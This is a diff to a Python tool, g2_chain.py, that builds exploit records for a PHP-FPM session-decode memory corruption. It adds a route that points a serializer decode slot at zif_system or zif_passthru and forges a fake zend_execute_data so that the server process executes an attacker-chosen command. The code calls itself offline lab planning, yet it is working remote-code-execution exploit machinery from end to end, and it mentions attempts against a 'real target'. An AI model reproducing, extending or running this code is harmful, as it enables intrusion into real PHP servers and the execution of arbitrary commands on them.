@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""g2_chain.py - G2 FPM chain profile and offline php_binary record plan.
+"""g2_chain.py - G2/G6 FPM chain profiles and offline record plans.
 
 G2 is the confirmed FPM route on the plain PHP 8.5.10 build, with derived
 profiles for 8.4.25, 8.1.34 and 7.4.33: a controlled bailout leaves a stale
@@ -9,15 +9,22 @@ forced END decode then calls the overwritten pointer with the session record
 bytes as rdi. The default php handler decode slot is not 16 byte aligned, so its
 profile target is the PS(serializer) slot plus a fake ps_serializer struct.
 
+G6 keeps the same write but points ps_serializers[2].decode at zif_system or
+zif_passthru and shapes the session buffer as a fake zend_execute_data:
+num_args=1 at S+0x2c, the argument value F at S+0x50, IS_STRING at S+0x58,
+F+0x10=strlen(F+0x18), and a non-empty NUL-free command at F+0x18. zif_system
+executes the command and is one-shot (its return_value write SIGSEGVs at
+php_exec+450); zif_passthru is the clean surviving control.
+
 This module is profile data plus arithmetic: it loads
 addresses/g2_fpm_<build>.json selected by version, binary md5 or path, computes
 
     used_slots = (target - (b0 + 0x10)) / 16
 
-and frames the php_binary record of receipts/fpmgadget (rec1 long zval, rec2
-payload with the fake php_unserialize_data and the fake var_dtor_entries).
-No transport and no process control: the driver step is --step g2 and only
-writes the record bytes plus the plan JSON.
+and frames the php_binary or zif record (rec1 key/long, rec2 payload with the
+fake php_unserialize_data, fake var_dtor_entries and, for G6, the fake
+zend_execute_data). No transport and no process control: the driver step is
+--step g2 and only writes the record bytes plus the plan JSON.
 """
 
 
@@ -47,6 +54,20 @@ PROFILE_MD5 = {
 COMMAND_BYTES = 32
 FAKE_P_BYTES = 72
 FAKE_B0_BYTES = 16
+
+# G6: the php_binary decode slot can be pointed at zif_system /
+# zif_passthru.  The session payload doubles as the fake zend_execute_data.
+DECODE_MODES = ("php_binary", "zif_system", "zif_passthru")
+ZIF_DECODE_MODES = ("zif_system", "zif_passthru")
+ZIF_KEY1_BYTES = 96
+ZIF_F_PAYLOAD_OFF = 0x100
+ZIF_CMD_LEN_OFF = ZIF_F_PAYLOAD_OFF + 0x10
+ZIF_CMD_OFF = ZIF_F_PAYLOAD_OFF + 0x18
+ZIF_NUM_ARGS_OFF = 0x2C
+ZIF_ARG1_VALUE_OFF = 0x50
+ZIF_ARG1_TYPE_OFF = 0x58
+ZIF_ARG1_IS_STRING = 6
+ZIF_RECEIPT = "/tmp/opencode/research/g6zif_20261021T222434Z"
 
 
 def hex_int(value, name: str) -> int:
@@ -164,16 +185,100 @@ def _long_value(value: str | bytes) -> bytes:
     return value
 
 
+def _zif_symbol(profile: dict, decode: str) -> int:
+    """Return the profile's zif_system/zif_passthru address."""
+    if decode not in ZIF_DECODE_MODES:
+        raise ValueError(
+            "decode must be one of " + ", ".join(DECODE_MODES)
+            + f", not {decode!r}"
+        )
+    if decode not in profile:
+        raise ValueError(
+            f"profile {profile.get('name')!r} has no {decode} address; "
+            "the profile is not G6-ready"
+        )
+    address = hex_int(profile[decode], f"{decode} address")
+    if not 0 < address < 1 << 64:
+        raise ValueError(f"{decode} address must be a positive 64 bit address")
+    return address
+
+
+def _zif_command_bytes(command: str | bytes) -> bytes:
+    """Normalize the zif command and enforce the parse requirements."""
+    if isinstance(command, str):
+        command = command.encode("latin1")
+    if not isinstance(command, bytes):
+        raise ValueError("command must be a str or bytes")
+    if not command:
+        raise ValueError("zif command is empty; php_exec_ex requires one string argument")
+    if b"\x00" in command:
+        raise ValueError(
+            "zif command contains a NUL byte; the command is a normal "
+            "NUL-terminated C string and the fake zend_string length must "
+            "equal strlen"
+        )
+    return command
+
+
+def _decode_entry(profile: dict, target: int) -> dict | None:
+    """Validate a serializer decode slot and return its profile entry."""
+    table = profile["ps_serializers"]
+    entry = None
+    for candidate in table["entries"]:
+        decode = hex_int(candidate["decode"], "decode slot")
+        if decode == target:
+            entry = candidate
+            if not candidate.get("decode_16b_aligned"):
+                raise ValueError(
+                    f"ps_serializers[{candidate['index']}] "
+                    f"({candidate['name']}) decode is not 16 byte aligned"
+                )
+    if entry is not None and target != (
+        hex_int(table["table"], "table")
+        + entry["index"] * profile["structs"]["ps_serializer_size"]
+        + 0x10
+    ):
+        raise ValueError("ps_serializers entry arithmetic disagrees with the table")
+    return entry
+
+
+def _overlaps(start_a: int, end_a: int, start_b: int, end_b: int) -> bool:
+    return start_a < end_b and start_b < end_a
+
+
 def plan(x: int, p: int, b0: int, total: int | None = None,
-         command: str | bytes = "id;exit;#", value: str | bytes | None = None,
+         command: str | bytes | None = None, value: str | bytes | None = None,
          libc_base: int | None = None, target: int | None = None,
          profile: dict | None = None,
-         profile_path: Path | None = None) -> dict:
-    """Offline G2 record plan from operator supplied addresses.
+         profile_path: Path | None = None,
+         decode: str = "php_binary",
+         x2: int | None = None) -> dict:
+    """Offline G2/G6 record plan from operator supplied addresses.
 
     All addresses are explicit. The module never guesses X, P, B0 or a libc
-    base; a missing or inconsistent address raises ValueError.
+    base; a missing or inconsistent address raises ValueError. ``decode`` is
+    ``php_binary`` (the original G2 record), ``zif_system`` (G6 one-shot) or
+    ``zif_passthru`` (G6 clean control); the zif modes require ``x2``.
     """
+    if decode not in DECODE_MODES:
+        raise ValueError(
+            "decode must be one of " + ", ".join(DECODE_MODES)
+            + f", not {decode!r}"
+        )
+    if command is None:
+        command = "id" if decode in ZIF_DECODE_MODES else "id;exit;#"
+    if decode != "php_binary":
+        if value is not None:
+            raise ValueError("--g2-value does not apply to a zif decode target")
+        if libc_base is not None:
+            raise ValueError("--libc-base does not apply to a zif decode target")
+        return plan_zif(
+            x=x, x2=x2, p=p, b0=b0, total=total, command=command,
+            decode=decode, target=target, profile=profile,
+            profile_path=profile_path,
+        )
+    if x2 is not None:
+        raise ValueError("--g2-x2 applies only to a zif decode target")
     if profile is None:
         profile, resolved_path = load_profile()
         if profile_path is None:
@@ -283,6 +388,9 @@ def plan(x: int, p: int, b0: int, total: int | None = None,
         "profile_source": str(profile_path) if profile_path is not None else None,
         "lane": profile["lane"],
         "stage": profile["stage"],
+        "route": "G2",
+        "decode": "php_binary",
+        "decode_kind": "php_binary",
         "status": profile["status"],
         "binary": profile["binary"],
         "build_id": profile["build_id"],
@@ -345,29 +453,385 @@ def plan(x: int, p: int, b0: int, total: int | None = None,
     }
 
 
+def plan_zif(x: int, x2: int | None, p: int, b0: int,
+             total: int | None = None, command: str | bytes | None = None,
+             decode: str = "zif_passthru", target: int | None = None,
+             profile: dict | None = None,
+             profile_path: Path | None = None) -> dict:
+    """Offline G6 plan: point php_binary decode at zif_system or passthru.
+
+    The write target remains ps_serializers[2].decode; the value written is the
+    selected zif handler address.  ``x`` is the first decode zend_string (the
+    planted T1 buffer), ``x2`` is the second decode zend_string (the re-encoded
+    T2 buffer).  P and B0 are relative to the first buffer, while the fake
+    zend_string pointer F is relative to the second one.
+    """
+    if decode not in ZIF_DECODE_MODES:
+        raise ValueError(
+            "zif decode must be one of " + ", ".join(ZIF_DECODE_MODES)
+            + f", not {decode!r}"
+        )
+    if profile is None:
+        profile, resolved_path = load_profile()
+        if profile_path is None:
+            profile_path = resolved_path
+    table = profile["ps_serializers"]
+    zif = _zif_symbol(profile, decode)
+    if target is None:
+        target = hex_int(table["default_target"], "default target")
+    if x2 is None:
+        raise ValueError(
+            f"--g2-decode {decode} requires --g2-x2: the second decode "
+            "buffer is where the fake execute_data is read"
+        )
+    for name, address in (
+        ("x", x), ("x2", x2), ("p", p), ("b0", b0), ("target", target),
+    ):
+        if not 0 < address < 1 << 64:
+            raise ValueError(f"{name} must be a positive 64 bit address")
+    if x + 24 >= 1 << 64 or x2 + 24 >= 1 << 64:
+        raise ValueError("record zend_string address overflows 64 bits")
+    if not x + 24 <= p:
+        raise ValueError(
+            f"P 0x{p:x} is not inside the first record buffer at X 0x{x:x} "
+            f"(ZSTR_VAL = X + 24)"
+        )
+    if not p + 0x48 <= b0:
+        raise ValueError(
+            f"B0 0x{b0:x} overlaps the fake php_unserialize_data at P 0x{p:x}"
+        )
+    if target % 16:
+        raise ValueError(f"target 0x{target:x} is not 16 byte aligned")
+    entry = _decode_entry(profile, target)
+    used_slots = used_slots_for(target, b0)
+    if target != b0 + 0x10 + 16 * used_slots:
+        raise ValueError("negative used_slots arithmetic is not exact")
+    second_slot = target + 16
+    if second_slot >= b0:
+        raise ValueError("second slot is not below b0; the write is not downward")
+
+    value_bytes = f"i:{zif};".encode("ascii")
+    if command is None:
+        command = "id"
+    command_bytes = _zif_command_bytes(command)
+    if total is None:
+        total = profile["record"]["lab_geometry"]["total"]
+    rec1_len = 1 + ZIF_KEY1_BYTES + len(value_bytes)
+    length, prefix_len, payload_start = _solve_lengths(total, rec1_len)
+    Q = payload_start
+    f_off = Q + ZIF_F_PAYLOAD_OFF
+    f_addr = x2 + 0x18 + f_off
+    if f_addr >= 1 << 64:
+        raise ValueError("fake zend_string pointer overflows 64 bits")
+    p_off = p - (x + 24)
+    b_off = b0 - (x + 24)
+    p_idx = p_off - Q
+    b_idx = b_off - Q
+    f_end = ZIF_CMD_OFF + len(command_bytes) + 1
+    command_ok = bool(command_bytes) and b"\x00" not in command_bytes
+
+    checks = [
+        {"check": "decode_mode", "ok": decode in ZIF_DECODE_MODES,
+         "detail": decode},
+        {"check": "zif_symbol", "ok": 0 < zif < 1 << 64,
+         "detail": f"0x{zif:x}"},
+        {"check": "key1_length", "ok": ZIF_KEY1_BYTES == 96,
+         "detail": f"{ZIF_KEY1_BYTES} byte binary session key"},
+        {"check": "value_is_zif_address", "ok": True,
+         "detail": value_bytes.decode("ascii")},
+        {"check": "target_16b_aligned", "ok": target % 16 == 0,
+         "detail": f"0x{target:x}"},
+        {"check": "used_slots_negative", "ok": used_slots < 0,
+         "detail": f"{used_slots}"},
+        {"check": "used_slots_exact",
+         "ok": target == b0 + 0x10 + 16 * used_slots,
+         "detail": f"K={used_slots} target=0x{target:x}"},
+        {"check": "second_slot", "ok": second_slot < b0,
+         "detail": f"0x{second_slot:x}"},
+        {"check": "fake_p_in_payload",
+         "ok": p_idx >= 0 and p_idx + FAKE_P_BYTES <= length,
+         "detail": f"p_off 0x{p_off:x} p_idx {p_idx} L {length}"},
+        {"check": "fake_b0_in_payload",
+         "ok": b_idx >= 0 and b_idx + FAKE_B0_BYTES <= length,
+         "detail": f"b_off 0x{b_off:x} b_idx {b_idx} L {length}"},
+        {"check": "fake_execute_data_in_payload",
+         "ok": ZIF_CMD_LEN_OFF + 8 <= length and f_end <= length,
+         "detail": f"F payload off 0x{ZIF_F_PAYLOAD_OFF:x} "
+                   f"cmd end {f_end} L {length}"},
+        {"check": "fake_execute_data_geometry",
+         "ok": ZIF_F_PAYLOAD_OFF + 0x18 == ZIF_CMD_OFF,
+         "detail": "F+0x10 length, F+0x18 command"},
+        {"check": "command_nonempty", "ok": command_ok,
+         "detail": f"{len(command_bytes)} bytes"},
+        {"check": "fake_p_no_execute_data_overlap",
+         "ok": not _overlaps(p_idx, p_idx + FAKE_P_BYTES,
+                             ZIF_F_PAYLOAD_OFF, f_end),
+         "detail": "fake P and fake execute_data are disjoint"},
+        {"check": "fake_b0_no_execute_data_overlap",
+         "ok": not _overlaps(b_idx, b_idx + FAKE_B0_BYTES,
+                             ZIF_F_PAYLOAD_OFF, f_end),
+         "detail": "fake B0 and fake execute_data are disjoint"},
+        {"check": "record_length", "ok": length > 0,
+         "detail": f"total {total} rec1 {rec1_len} L {length}"},
+    ]
+    failed = [item["check"] for item in checks if not item["ok"]]
+    if failed:
+        raise ValueError("zif record checks failed: " + ", ".join(failed))
+
+    # Record 1 is a 96 byte binary key followed by the serialized zif address.
+    # In the re-encoded buffer the key is written back verbatim, so file
+    # offsets 0x2c/0x50/0x58 become execute_data fields on decode #2.
+    key1 = bytearray(b"A" * ZIF_KEY1_BYTES)
+    struct.pack_into("<I", key1, ZIF_NUM_ARGS_OFF - 1, 1)
+    struct.pack_into("<Q", key1, ZIF_ARG1_VALUE_OFF - 1, f_addr)
+    key1[ZIF_ARG1_TYPE_OFF - 1] = ZIF_ARG1_IS_STRING
+    rec1 = bytes([ZIF_KEY1_BYTES]) + bytes(key1) + value_bytes
+    if len(rec1) != rec1_len:
+        raise ValueError("record 1 length changed during construction")
+    prefix = b"\x01zs:" + str(length).encode("ascii") + b':"'
+    if len(prefix) != prefix_len:
+        raise ValueError("record 2 prefix length changed during construction")
+
+    payload = bytearray(length)
+    struct.pack_into(
+        "<QQQQQQQQ", payload, p_idx,
+        p + 56, b0, b0, 0, 0, 0, 0x7FFFFFFF,
+        profile["structs"]["var_entries_max"],
+    )
+    payload[p_idx + 64:p_idx + 72] = b"\x00" * 8
+    struct.pack_into("<qQ", payload, b_idx, used_slots, 0)
+    struct.pack_into("<Q", payload, ZIF_CMD_LEN_OFF, len(command_bytes))
+    payload[ZIF_CMD_OFF:ZIF_CMD_OFF + len(command_bytes)] = command_bytes
+    payload[ZIF_CMD_OFF + len(command_bytes)] = 0
+    record = rec1 + prefix + bytes(payload) + b'";'
+    if len(record) != total:
+        raise ValueError(f"record is {len(record)} bytes, expected {total}")
+    if record[0] != ZIF_KEY1_BYTES:
+        raise ValueError("key1 length byte mismatch")
+    if record[payload_start + p_idx:payload_start + p_idx + 8] != \
+            struct.pack("<Q", p + 56):
+        raise ValueError("fake P placement mismatch")
+    if record[payload_start + b_idx:payload_start + b_idx + 8] != \
+            struct.pack("<q", used_slots):
+        raise ValueError("fake B0 placement mismatch")
+    if record[payload_start + ZIF_CMD_LEN_OFF:
+              payload_start + ZIF_CMD_LEN_OFF + 8] != \
+            struct.pack("<Q", len(command_bytes)):
+        raise ValueError("fake zend_string length mismatch")
+    if record[payload_start + ZIF_CMD_OFF:
+              payload_start + ZIF_CMD_OFF + len(command_bytes)] != command_bytes:
+        raise ValueError("fake command placement mismatch")
+
+    if decode == "zif_passthru":
+        target_behavior = (
+            "clean: php_exec type=3 (passthru) never writes return_value; "
+            "the lab request returned HTTP 200 and the worker survived"
+        )
+    else:
+        target_behavior = (
+            "one-shot: php_exec type=1 (system) executes the command, then "
+            "writes a zval through return_value=ZSTR_LEN(data) and SIGSEGVs "
+            "at php_exec+450; no parameterless clean path"
+        )
+
+    caveats = list(profile.get("caveats") or [])
+    caveats.extend([
+        f"{decode}: {target_behavior}",
+        "G6 needs both decode buffers: X (first, planted T1) for P/B0 and "
+        "X2 (second, re-encoded T2) for the fake execute_data pointer F; "
+        "the planted and re-encoded lengths differ (lab: 131014 -> 131313)",
+        "the fake execute_data is the session buffer itself: num_args=1 at "
+        "S+0x2c, arg1 value at S+0x50, IS_STRING (6) at S+0x58, "
+        "F+0x10=length(F+0x18), command non-empty and NUL-free; func and "
+        "arg_info are not read",
+        "zif_passthru is preferred when the worker must survive; zif_system "
+        "is a one-shot proof because the php_exec return-value write is "
+        "unavoidable for type=1",
+        "real-target status: F12b pending, F14 attempted-negative, boot2 "
+        "lab-only leak; the G6 proof is a private ASLR-off lab run",
+    ])
+    receipts = dict(profile.get("receipts") or {})
+    receipts.setdefault("G6", ZIF_RECEIPT)
+
+    return {
+        "profile": profile["name"],
+        "profile_source": str(profile_path) if profile_path is not None else None,
+        "lane": profile["lane"],
+        "stage": profile["stage"],
+        "route": "G6",
+        "decode": decode,
+        "decode_kind": "zif",
+        "clean": decode == "zif_passthru",
+        "one_shot": decode == "zif_system",
+        "target_behavior": target_behavior,
+        "status": profile["status"],
+        "binary": profile["binary"],
+        "build_id": profile["build_id"],
+        "md5": profile.get("md5"),
+        "php_version": profile["php_version"],
+        "elf_type": profile["elf_type"],
+        "pie": profile["pie"],
+        "zend_eval_string": profile.get("zend_eval_string"),
+        "zend_eval_stringl": profile.get("zend_eval_stringl"),
+        "dry_run": True,
+        "sent": False,
+        "no_transport": True,
+        "addresses": {
+            "x": f"0x{x:x}",
+            "x1": f"0x{x:x}",
+            "x2": f"0x{x2:x}",
+            "zstr_val": f"0x{x + 24:x}",
+            "zstr_val1": f"0x{x + 24:x}",
+            "zstr_val2": f"0x{x2 + 24:x}",
+            "p": f"0x{p:x}",
+            "b0": f"0x{b0:x}",
+            "target": f"0x{target:x}",
+            "zif": f"0x{zif:x}",
+            "zif_system": (
+                f"0x{hex_int(profile['zif_system'], 'zif_system'):x}"
+                if profile.get("zif_system") is not None else None),
+            "zif_passthru": (
+                f"0x{hex_int(profile['zif_passthru'], 'zif_passthru'):x}"
+                if profile.get("zif_passthru") is not None else None),
+            "php_exec_ex": (
+                f"0x{hex_int(profile['php_exec_ex'], 'php_exec_ex'):x}"
+                if profile.get("php_exec_ex") is not None else None),
+            "php_exec": (
+                f"0x{hex_int(profile['php_exec'], 'php_exec'):x}"
+                if profile.get("php_exec") is not None else None),
+            "system": None,
+            "libc_base": None,
+        },
+        "target_entry": (
+            {"index": entry["index"], "name": entry["name"]}
+            if entry is not None else None
+        ),
+        "ps_serializers": {
+            "table": table["table"],
+            "active_serializer_slot": table["active_serializer_slot"],
+            "terminator": table["terminator"],
+            "default_handler": table.get("default_handler"),
+            "default_php_decode": table.get("default_php_decode"),
+            "default_php_decode_16b_aligned": table.get(
+                "default_php_decode_16b_aligned"),
+            "note": table.get("note"),
+        },
+        "ps_serializer_slot": profile.get("ps_serializer_slot"),
+        "decode_call": profile["decode_call"],
+        "used_slots": used_slots,
+        "slot": f"0x{target:x}",
+        "second_slot": f"0x{second_slot:x}",
+        "type_zero_offsets": [
+            f"0x{target + 8:x}", f"0x{target + 24:x}"],
+        "fake_execute_data": {
+            "base": "ZSTR_VAL(data) = X2 + 0x18",
+            "num_args_off": "0x2c",
+            "num_args": 1,
+            "arg1_value_off": "0x50",
+            "arg1_value": f"0x{f_addr:x}",
+            "arg1_type_off": "0x58",
+            "arg1_type": ZIF_ARG1_IS_STRING,
+            "arg1_type_name": "IS_STRING",
+            "zend_string_len_off": "0x10",
+            "zend_string_len": len(command_bytes),
+            "zend_string_val_off": "0x18",
+            "command": command_bytes.decode("latin1"),
+            "func_read": False,
+            "arg_info_read": False,
+        },
+        "geometry": {
+            "total": total,
+            "rec1_len": rec1_len,
+            "key1_len": ZIF_KEY1_BYTES,
+            "command_bytes": len(command_bytes),
+            "value": value_bytes.decode("ascii"),
+            "length": length,
+            "payload_start": Q,
+            "p_off": p_off,
+            "p_idx": p_idx,
+            "b_off": b_off,
+            "b_idx": b_idx,
+            "f_payload_off": ZIF_F_PAYLOAD_OFF,
+            "f_off": f_off,
+            "f_addr": f_addr,
+            "cmd_len_off": Q + ZIF_CMD_LEN_OFF,
+            "cmd_off": Q + ZIF_CMD_OFF,
+            "command_hex": command_bytes.hex(),
+            "second_decode": (
+                "the re-encoded T2 buffer is the second php_session_decode "
+                "argument; the lab T1/T2 were 131014/131313 bytes"
+            ),
+        },
+        "checks": checks,
+        "prerequisites": list(profile.get("prerequisites") or []) + [
+            "G6: supply X1 and X2 for the first and second decode buffers, "
+            "plus P and B0; zif_passthru is the clean survivor, zif_system "
+            "is one-shot",
+            "G6: the fake execute_data fields live in the 96 byte key1 and "
+            "the record-2 payload; the command is NUL-free and F+0x10 is its "
+            "strlen",
+        ],
+        "caveats": caveats,
+        "receipts": receipts,
+        "record": record,
+    }
+
+
 def main() -> int:
     parser = argparse.ArgumentParser(
-        description="G2 FPM record plan (offline, no transport)")
-    parser.add_argument("--g2-x", required=True, help="record buffer zend_string X")
+        description="G2/G6 FPM record plan (offline, no transport)")
+    parser.add_argument("--g2-x", required=True, help="first decode zend_string X")
+    parser.add_argument("--g2-x2", default=None,
+                        help="second decode zend_string X2 (required for zif_*)")
     parser.add_argument("--g2-p", required=True, help="stale php_unserialize_data P")
     parser.add_argument("--g2-b0", required=True, help="stale var_dtor_entries B0")
     parser.add_argument("--g2-profile", default=None,
                         help="profile version, md5 or .json path (default 8.5.10)")
+    parser.add_argument("--g2-decode", choices=DECODE_MODES, default="php_binary",
+                        help="php_binary (G2), zif_passthru (G6 clean) or "
+                             "zif_system (G6 one-shot)")
     parser.add_argument("--g2-total", type=int, default=None)
     parser.add_argument("--g2-target", default=None)
     parser.add_argument("--g2-value", default=None)
     parser.add_argument("--libc-base", default=None)
-    parser.add_argument("--command", default="id;exit;#")
+    parser.add_argument("--command", default=None)
     parser.add_argument("--output", type=Path, default=None)
     args = parser.parse_args()
+    if args.g2_decode in ZIF_DECODE_MODES:
+        if args.g2_x2 is None:
+            print(json.dumps({
+                "step": "g2", "decode": args.g2_decode,
+                "error": f"ValueError: --g2-decode {args.g2_decode} requires "
+                         "--g2-x2 (the second decode buffer)",
+            }))
+            return 2
+        if args.g2_value is not None or args.libc_base is not None:
+            print(json.dumps({
+                "step": "g2", "decode": args.g2_decode,
+                "error": "ValueError: --g2-value/--libc-base do not apply to "
+                         "a zif decode target; the written value is the profile "
+                         "zif handler address",
+            }))
+            return 2
+    elif args.g2_x2 is not None:
+        print(json.dumps({
+            "step": "g2", "decode": args.g2_decode,
+            "error": "ValueError: --g2-x2 applies only to a zif decode target",
+        }))
+        return 2
+    command = args.command
+    if command is None:
+        command = "id" if args.g2_decode in ZIF_DECODE_MODES else "id;exit;#"
     try:
         profile, profile_path = load_profile(args.g2_profile)
         summary = plan(
             x=hex_int(args.g2_x, "--g2-x"),
+            x2=(hex_int(args.g2_x2, "--g2-x2")
+                if args.g2_x2 is not None else None),
             p=hex_int(args.g2_p, "--g2-p"),
             b0=hex_int(args.g2_b0, "--g2-b0"),
             total=args.g2_total,
-            command=args.command,
+            command=command,
             value=args.g2_value,
             libc_base=(hex_int(args.libc_base, "--libc-base")
                        if args.libc_base is not None else None),
@@ -375,6 +839,7 @@ def main() -> int:
                     if args.g2_target is not None else None),
             profile=profile,
             profile_path=profile_path,
+            decode=args.g2_decode,
         )
     except (OSError, TypeError, ValueError) as error:
         print(json.dumps({"step": "g2", "error": f"{type(error).__name__}: {error}"}))
